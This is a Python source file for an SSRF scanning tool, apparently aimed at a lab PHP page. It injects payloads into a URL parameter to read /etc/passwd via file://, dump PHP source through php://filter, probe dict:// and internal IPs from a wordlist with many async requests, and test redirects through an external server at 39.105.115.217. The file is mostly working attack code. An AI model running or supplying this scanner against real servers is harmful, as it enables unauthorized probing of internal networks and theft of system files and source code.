import requests
import re
import sys
import asyncio
from aiohttp import ClientSession
from difflib import SequenceMatcher 
from urllib.parse import quote
from colorama import Fore, Style, Back

class ssrfScan():

    def __init__(self,url,remoteFile=None,num=100):
        self.url = url
        self.headers =  {
        'User-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8',
        'Accept-Language': 'Zh-CN, zh;q=0.8, en-gb;q=0.8, en-us;q=0.8',
        'Accept-Encoding': 'identity',
        'Keep-Alive': '300',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
    	}
        self.queue = asyncio.Queue()
        self.tasks=[]
        self.loop = asyncio.get_event_loop()
        self.remoteFile = remoteFile
        self.num = num


    #dict 协议
    def dictScan(self):
        payload = "dict://127.0.0.1:80/sunsec_test"
        url = self.url.replace("*",payload)
        content = requests.get(url,headers = self.headers).text
        #print(content)
        if re.search("HTTP\/(.|\n)*Server:(.|\n)*",content):
            sys.stdout.write(Fore.LIGHTGREEN_EX +"[*]dict protocol is available!\n")

    #file协议
    def FileScan(self):
        payload = "file:///etc/passwd"
        url = self.url.replace("*",payload)
        content = requests.get(url,headers = self.headers).text
        #print(content)
        if "root:x:0:0:root:/root:/bin/bash" in content:
            sys.stdout.write(Fore.LIGHTGREEN_EX +"[*]file protocol is available!\n")

    #php伪协议
    def phpScan(self):
        file = self.url.split("/")[-1].split("?")[0]
        payload = "php://filter/read=convert.base64-encode/resource={}".format(file)
        url = self.url.replace("*",payload)
        content = requests.get(url,headers = self.headers).text
        #print(content)
        if re.search("[a-z0-9A-Z=+/]{60}",content):
            sys.stdout.write(Fore.LIGHTGREEN_EX +"[*]php protocol is available!\n")
    
    def url_in_queue(self):
        file = "ssrf/url.txt"
        with open(file,"rb") as f:
            for item in f:
                self.queue.put_nowait(item.decode("utf-8").strip("\r\n"))
    
    async def get_response(self,url,session):
        url = self.url.replace("*",url)
        #print(url)
        s = await session.get(url,headers = self.headers)
        return await s.text() 

    def get_ratio(self,res_text):
        seqm = SequenceMatcher()
        url = self.url.split("?")[0]
        text = requests.get(url,headers = self.headers).text
        #print(text,res_text,sep="\n========================\n")
        seqm.set_seq1(text)
        seqm.set_seq2(res_text)
        return seqm.ratio()

    async def httpScan(self):
        session = ClientSession()
        while True:
            if not self.queue.empty():
                url = await self.queue.get()
                #print(url)
                try:
                    text = await self.get_response(url,session)
                    ratio = self.get_ratio(text)
                    #print(ratio)
                    if ratio < 0.3 and "400 Bad Request" not in text:
                        sys.stdout.write(Fore.LIGHTGREEN_EX +"[*]ip {}  is available!\n".format(url))
                except:
                    pass
            else:
				#print(param)
                await session.close()
                break

    def start(self):
        self.tasks = [self.httpScan() for i in range(self.num)]
        self.loop.run_until_complete(asyncio.wait(self.tasks)) 

    def redirectScan(self):
        url = self.url.replace("*",self.remoteFile)
        #print(url)
        content = requests.get(url,headers = self.headers).text
        ratio = self.get_ratio(content)
        #print(content)
        if ratio < 0.3:
            sys.stdout.write(Fore.LIGHTGREEN_EX +"[*]302 redirect is available!\n")

if __name__ == "__main__":

    a = ssrfScan("http://192.168.8.181/ssrf/1.php?url=*",remoteFile = "http://39.105.115.217:8888/302.php")
    a.url_in_queue()
    #a.FileScan()
    #a.dictScan()
    a.start()
    #a.redirectScan()